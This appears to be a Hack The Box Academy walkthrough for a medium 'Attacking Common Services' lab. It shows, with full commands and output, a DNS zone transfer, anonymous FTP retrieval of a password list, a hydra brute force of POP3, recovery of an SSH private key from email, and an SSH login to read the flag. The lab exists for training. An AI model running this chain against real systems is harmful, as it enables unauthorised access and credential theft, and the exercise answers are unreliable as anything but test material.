# 

---

The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

---
## Question 1

### "Assess the target server and find the the flag.txt file. Submit the contents of this file as your answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A STMIP
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ nmap -A 10.129.183.208

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:47 GMT
Nmap scan report for 10.129.183.208
Host is up (0.013s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
<SNIP>
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
<SNIP>
```

Students will notice that there is a DNS server running, therefore, they need to attempt a zone transfer with `dig`:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ dig AXFR inlanefreight.htb @10.129.183.208

; <<>> DiG 9.16.27-Debian <<>> AXFR inlanefreight.htb @10.129.183.208
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.200.5
dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
un.inlanefreight.htb.	604800	IN	A	10.129.200.142
ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 13 msec
;; SERVER: 10.129.183.208#53(10.129.183.208)
;; WHEN: Sun Nov 27 16:59:44 GMT 2022
;; XFR size: 13 records (messages 1, bytes 372)
```

Subsequently, students need to add the vHost `int-ftp.inlanefreight.htb` (this can be easily known as the section says "From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.") into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP int-ftp.inlanefreight.htb" >> /etc/hosts'
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
```

Launching an `Nmap` scan agains `int-ftp.inlanefreight.htb`, students will find that port 30021 runs `ProFTPD`:

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nmap -p- -T4 -A int-ftp.inlanefreight.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 17:16 GMT
Nmap scan report for int-ftp.inlanefreight.htb (10.129.183.208)
Host is up (0.014s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
<SNIP>
30021/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.183.208]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

When attempting to use anonymous FTP login (i.e., `anonymous` for username and anything for password) on port 30021, students will notice that they can login successfully:

Code: shell

```shell
ftp int-ftp.inlanefreight.htb 30021
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ ftp int-ftp.inlanefreight.htb 30021

Connected to int-ftp.inlanefreight.htb.
220 ProFTPD Server (Internal FTP) [10.129.183.208]
Name (int-ftp.inlanefreight.htb:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
```

Listing directories and files with `ls`, students will notice that there is a directory by the name `simon`:

Code: shell

```shell
ls
```

  Attacking Common Services - Medium

```shell-session
ftp> ls

200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
```

After moving directories into `simon`, students need to `get` the file "mynotes.txt":

Code: shell

```shell
cd simon
get mynotes.txt
bye
```

  Attacking Common Services - Medium

```shell-session
ftp> cd simon

250 CWD command successful
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
200 PORT command successful
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
226 Transfer complete
153 bytes received in 0.00 secs (53.1723 kB/s)
ftp> bye
221 Goodbye.
```

Checking the contents of the file "mynotes.txt", students will notice that it contains a possible wordlist of passwords, thus, they need to use it to bruteforce the password for the user `simon` on the `POP3` service, finding the credentials `simon:8Ns8j1b!23hs4921smHzwn`:

Code: shell

```shell
hydra -l simon -P mynotes.txt pop3://STMIP
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ hydra -l simon -P mynotes.txt pop3://10.129.183.208

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 17:32:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.183.208:110/
[110][pop3] host: 10.129.183.208   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-27 17:32:05
```

With the attained credentials, students need to connect to port 110 and use `simon` for user and `8Ns8j1b!23hs4921smHzwn` for password to log in:

Code: shell

```shell
nc -nv STMIP 110
user simon
pass 8Ns8j1b!23hs4921smHzwn
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nc -nv 10.129.183.208 110

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.183.208:110.
+OK Dovecot (Ubuntu) ready.
user simon
+OK
pass 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
```

When using the `list` command, students will find that there is only one email, thus, they need to use `retr` on its index:

Code: shell

```shell
list
retr 1
quit
```

  Attacking Common Services - Medium

```shell-session
list

+OK 1 messages:
1 1630
.
retr 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
	id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg 
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== 
-----END OPENSSH PRIVATE KEY-----
```

Students need to save the SSH private key into a file, after removing the newline characters with `sed` (students also need to fix the header and footer so that they are only on one line, alternatively, students can paste in the key without the header and footer into [samltool](https://www.samltool.com/format_privatekey.php) to get it formatted properly):

Code: shell

```shell
echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

The final SSH private key is:

  Attacking Common Services - Medium

```shell-session
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm
w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH
c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W
1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi
6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR
Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi
ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ
hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz
B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA
AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ==
-----END OPENSSH PRIVATE KEY-----
```

Before utilizing the private key, students first need to change its permissions so that it is 600:

Code: shell

```shell
chmod 600 id_rsa
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

At last, students need to use the private key to connect to the SSH service on the spawned target, using the username `simon`, and then printing out the flag file "flag.txt":

Code: shell

```shell
ssh -i id_rsa simon@10.129.229.46
cat flag.txt
```

  Attacking Common Services - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ ssh -i id_rsa simon@10.129.229.46

The authenticity of host '10.129.229.46 (10.129.229.46)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.46' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
<SNIP>
simon@lin-medium:~$ cat flag.txt

HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

Answer: {hidden}